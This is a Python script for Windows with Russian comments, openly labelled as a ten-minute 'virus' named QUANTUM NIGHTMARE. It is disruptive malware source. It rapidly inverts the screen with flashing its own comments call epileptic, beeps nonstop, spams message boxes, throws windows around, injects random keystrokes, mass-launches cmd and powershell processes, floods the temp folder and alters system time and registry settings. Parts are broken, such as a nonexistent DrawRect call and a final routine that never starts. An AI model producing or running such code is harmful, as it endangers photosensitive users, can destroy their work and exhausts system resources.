import os
import sys
import shutil
import subprocess
import random
import ctypes
import time
import threading
import winsound
import tempfile
import math
from ctypes import wintypes

# === ВИРУС "QUANTUM NIGHTMARE" ===
# 10 минут максимально агрессивного цифрового ада

class QuantumNightmare:
    def __init__(self):
        self.active = True
        self.start_time = time.time()
        self.effect_count = 0
        
    # 1. КВАНТОВЫЙ ВИЗУАЛЬНЫЙ ШТОРМ
    def quantum_visual_storm(self):
        def visual_attack():
            while self.active:
                try:
                    # Бешеная смена цветов
                    for _ in range(50):
                        r = random.randint(0, 255)
                        g = random.randint(0, 255) 
                        b = random.randint(0, 255)
                        color = (b << 16) | (g << 8) | r
                        ctypes.windll.user32.InvertRect(ctypes.windll.user32.GetDC(0), 
                                                       ctypes.byref(wintypes.RECT(0, 0, 5000, 5000)))
                        time.sleep(0.05)
                    
                    # Случайные геометрические фигуры
                    for _ in range(20):
                        x, y = random.randint(0, 1920), random.randint(0, 1080)
                        w, h = random.randint(100, 500), random.randint(100, 500)
                        ctypes.windll.user32.DrawRect(ctypes.windll.user32.GetDC(0), x, y, x+w, y+h)
                    time.sleep(1)
                except:
                    pass
        threading.Thread(target=visual_attack, daemon=True).start()
    
    # 2. СИМФОНИЯ ХАОСА - АУДИО АТАКА
    def chaos_symphony(self):
        def audio_hell():
            frequencies = [37, 73, 130, 261, 523, 1046, 2093, 4186]
            while self.active:
                try:
                    # Быстрая последовательность звуков
                    for _ in range(100):
                        freq = random.choice(frequencies)
                        duration = random.randint(50, 200)
                        winsound.Beep(freq, duration)
                    time.sleep(2)
                except:
                    pass
        threading.Thread(target=audio_hell, daemon=True).start()
    
    # 3. ЭПИЛЕПТИЧЕСКИЕ ОКНА
    def epileptic_windows(self):
        def window_madness():
            while self.active:
                try:
                    # Сумасшедшее движение окон
                    ENUM_WINDOWS = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
                    
                    def enum_proc(hwnd, lParam):
                        if ctypes.windll.user32.IsWindowVisible(hwnd):
                            for _ in range(10):
                                x = random.randint(-500, 500)
                                y = random.randint(-500, 500)
                                ctypes.windll.user32.SetWindowPos(hwnd, None, x, y, 0, 0, 0x0001)
                                time.sleep(0.01)
                        return True
                    
                    ctypes.windll.user32.EnumWindows(ENUM_WINDOWS(enum_proc), 0)
                    time.sleep(0.5)
                except:
                    pass
        threading.Thread(target=window_madness, daemon=True).start()
    
    # 4. НЕЙРОННЫЙ ВЗРЫВ - БЫСТРЫЕ СООБЩЕНИЯ
    def neural_explosion(self):
        messages = [
            "КВАНТОВЫЙ СБОЙ", "СИСТЕМНЫЙ КОЛЛАПС", "НЕЙРОННАЯ СЕТЬ УНИЧТОЖЕНА",
            "ХАОС АКТИВИРОВАН", "БЕГСТВО БЕСПОЛЕЗНО", "ТВОЙ ПК МОЙ",
            "MATRIX HAS YOU", "01010011 01001111 01010011",
            "CRITICAL FAILURE", "QUANTUM ENTANGLEMENT DETECTED",
            "SYSTEM INTEGRITY: 0%", "TIME REMAINING: ∞", "ERROR: ERROR: ERROR",
            "DIMENSIONAL BREACH", "REALITY CORRUPTION", "DIGITAL HELL ACTIVE"
        ]
        
        def message_spam():
            while self.active:
                try:
                    for _ in range(15):
                        msg = random.choice(messages)
                        ctypes.windll.user32.MessageBoxW(0, msg * random.randint(1, 3), 
                                                        "QUANTUM NIGHTMARE", 0x10 | 0x1000)
                        time.sleep(0.1)
                    time.sleep(5)
                except:
                    pass
        threading.Thread(target=message_spam, daemon=True).start()
    
    # 5. ХРОНО-ИСКАЖЕНИЕ КУРСОРА
    def chrono_cursor_distortion(self):
        def cursor_chaos():
            cursor_styles = [32512, 32513, 32514, 32515, 32516, 32640, 32641, 32642, 32643, 32644, 32645, 32646]
            while self.active:
                try:
                    # Бешеная смена курсоров
                    for _ in range(100):
                        new_cursor = ctypes.windll.user32.LoadCursorW(0, random.choice(cursor_styles))
                        ctypes.windll.user32.SetCursor(new_cursor)
                        
                        # Двигаем курсор по спирали
                        for i in range(36):
                            angle = i * 10
                            radius = i * 5
                            x = 960 + int(radius * math.cos(math.radians(angle)))
                            y = 540 + int(radius * math.sin(math.radians(angle)))
                            ctypes.windll.user32.SetCursorPos(x, y)
                            time.sleep(0.01)
                except:
                    pass
        threading.Thread(target=cursor_chaos, daemon=True).start()
    
    # 6. КИБЕР-СПАЗМ КЛАВИАТУРЫ
    def cyber_keyboard_spasm(self):
        def keyboard_attack():
            chars = "abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?/~`"
            while self.active:
                try:
                    # Массовая симуляция ввода
                    for _ in range(500):
                        char = random.choice(chars)
                        ctypes.windll.user32.keybd_event(ord(char.upper()), 0, 0, 0)
                        ctypes.windll.user32.keybd_event(ord(char.upper()), 0, 2, 0)
                        time.sleep(0.001)
                    time.sleep(1)
                except:
                    pass
        threading.Thread(target=keyboard_attack, daemon=True).start()
    
    # 7. ПРОСТРАНСТВЕННЫЙ РАЗРЫВ ЭКРАНА
    def spatial_screen_tear(self):
        def screen_apocalypse():
            while self.active:
                try:
                    # Интенсивное мигание
                    for _ in range(200):
                        ctypes.windll.user32.InvertRect(ctypes.windll.user32.GetDC(0), 
                                                       ctypes.byref(wintypes.RECT(0, 0, 5000, 5000)))
                        time.sleep(0.01)
                    
                    # Случайные прямоугольники
                    for _ in range(50):
                        x1, y1 = random.randint(0, 1920), random.randint(0, 1080)
                        x2, y2 = random.randint(0, 1920), random.randint(0, 1080)
                        ctypes.windll.gdi32.Rectangle(ctypes.windll.user32.GetDC(0), x1, y1, x2, y2)
                    time.sleep(2)
                except:
                    pass
        threading.Thread(target=screen_apocalypse, daemon=True).start()
    
    # 8. ЦИФРОВАЯ ИНФЕКЦИЯ - ФАЙЛОВЫЙ ВИРУС
    def digital_infection(self):
        def file_infection():
            infection_text = "QUANTUM NIGHTMARE INFECTION - SYSTEM COMPROMISED"
            while self.active:
                try:
                    # Создаем инфекционные файлы
                    for i in range(50):
                        temp_path = os.path.join(tempfile.gettempdir(), 
                                               f"quantum_infection_{random.randint(10000,99999)}.virus")
                        with open(temp_path, 'w', encoding='utf-8') as f:
                            f.write(infection_text * random.randint(10, 100))
                    time.sleep(3)
                except:
                    pass
        threading.Thread(target=file_infection, daemon=True).start()
    
    # 9. СИСТЕМНЫЙ ЦУНАМИ - ПРОЦЕССОРНАЯ АТАКА
    def system_tsunami(self):
        def process_tsunami():
            processes = ['notepad.exe', 'calc.exe', 'mspaint.exe', 'write.exe', 'cmd.exe', 'powershell.exe']
            while self.active:
                try:
                    # Массовый запуск процессов
                    for _ in range(20):
                        proc = random.choice(processes)
                        for _ in range(5):
                            subprocess.Popen(proc, shell=True)
                    time.sleep(2)
                except:
                    pass
        threading.Thread(target=process_tsunami, daemon=True).start()
    
    # 10. ГРАВИТАЦИОННЫЙ КОЛЛАПС ПАПОК
    def gravitational_collapse(self):
        def folder_chaos():
            while self.active:
                try:
                    # Создаем хаотичную структуру папок
                    base_path = tempfile.gettempdir()
                    for i in range(10):
                        deep_path = base_path
                        for j in range(5):
                            deep_path = os.path.join(deep_path, f"quantum_collapse_{random.randint(1000,9999)}")
                            os.makedirs(deep_path, exist_ok=True)
                            
                            # Создаем файлы в папках
                            for k in range(3):
                                file_path = os.path.join(deep_path, f"chaos_file_{random.randint(10000,99999)}.tmp")
                                with open(file_path, 'w') as f:
                                    f.write("GRAVITATIONAL COLLAPSE DETECTED" * 100)
                    time.sleep(10)
                except:
                    pass
        threading.Thread(target=folder_chaos, daemon=True).start()
    
    # 11. ТЕМПОРАЛЬНЫЙ ВИХРЬ - ИЗМЕНЕНИЕ ВРЕМЕНИ
    def temporal_vortex(self):
        def time_chaos():
            while self.active:
                try:
                    # Быстрое изменение времени системы (визуальное)
                    for _ in range(100):
                        new_time = random.randint(0, 23)
                        subprocess.run(f'time {new_time}:{random.randint(0,59)}:{random.randint(0,59)}', 
                                     shell=True, capture_output=True)
                        time.sleep(0.1)
                    time.sleep(30)
                except:
                    pass
        threading.Thread(target=time_chaos, daemon=True).start()
    
    # 12. РЕАЛЬНОСТЬ GLITCH - ИСКАЖЕНИЕ ШРИФТОВ
    def reality_glitch(self):
        def font_glitch():
            while self.active:
                try:
                    # Быстрое изменение размера шрифта консоли
                    for size in range(5, 50, 2):
                        subprocess.run(f'reg add "HKCU\\Console" /v FontSize /t REG_DWORD /d {size} /f', 
                                     shell=True, capture_output=True)
                        time.sleep(0.1)
                    time.sleep(5)
                except:
                    pass
        threading.Thread(target=font_glitch, daemon=True).start()
    
    # 13. КВАНТОВАЯ СУПЕРПОЗИЦИЯ - МНОГОПОТОЧНЫЙ ХАОС
    def quantum_superposition(self):
        def super_chaos():
            chaos_functions = [
                self.quantum_visual_storm,
                self.chaos_symphony,
                self.epileptic_windows,
                self.neural_explosion,
                self.chrono_cursor_distortion,
                self.cyber_keyboard_spasm,
                self.spatial_screen_tear,
                self.digital_infection,
                self.system_tsunami,
                self.gravitational_collapse,
                self.temporal_vortex,
                self.reality_glitch
            ]
            
            # Запускаем все функции в отдельных потоках
            for func in chaos_functions:
                try:
                    threading.Thread(target=func, daemon=True).start()
                    time.sleep(0.5)
                except:
                    pass
        threading.Thread(target=super_chaos, daemon=True).start()
    
    # 14. ФИНАЛЬНЫЙ БИГ БАНГ
    def final_big_bang(self):
        def big_bang():
            # Ждем 9 минут перед финальным апокалипсисом
            time.sleep(540)
            
            if self.active:
                try:
                    # Финальный мега-хаос
                    for _ in range(1000):
                        # Ультра-быстрое мигание
                        ctypes.windll.user32.InvertRect(ctypes.windll.user32.GetDC(0), 
                                                       ctypes.byref(wintypes.RECT(0, 0, 5000, 5000)))
                        
                        # Ультра-быстрые звуки
                        winsound.Beep(random.randint(37, 4000), 10)
                        
                        # Ультра-быстрые сообщения
                        if _ % 100 == 0:
                            ctypes.windll.user32.MessageBoxW(0, "BIG BANG IMMINENT", "FINAL CHAOS", 0x10)
                        
                        time.sleep(0.001)
                    
                    # Финальное сообщение
                    ctypes.windll.user32.MessageBoxW(0, 
                                                    "QUANTUM NIGHTMARE COMPLETE\nSYSTEM WILL NOW RETURN TO NORMAL", 
                                                    "QUANTUM DECOMPRESSION", 
                                                    0x40)
                    
                except:
                    pass
    
    # АКТИВАЦИЯ КВАНТОВОГО КОШМАРА
    def activate_quantum_nightmare(self):
        print("🌌 QUANTUM NIGHTMARE АКТИВИРОВАН...")
        print("⏰ Продолжительность: 10 минут цифрового ада")
        
        # Запускаем суперпозицию всего хаоса
        self.quantum_superposition()
        
        # Запускаем финальный Big Bang
        self.final_big_bang()
        
        print("🔥 Все системы хаоса активированы!")
        
        # 10 минут работы
        time.sleep(600)
        self.active = False
        print("✅ QUANTUM NIGHTMARE деактивирован")

# === ЗАПУСК ===
if __name__ == "__main__":
    nightmare = QuantumNightmare()
    nightmare.activate_quantum_nightmare()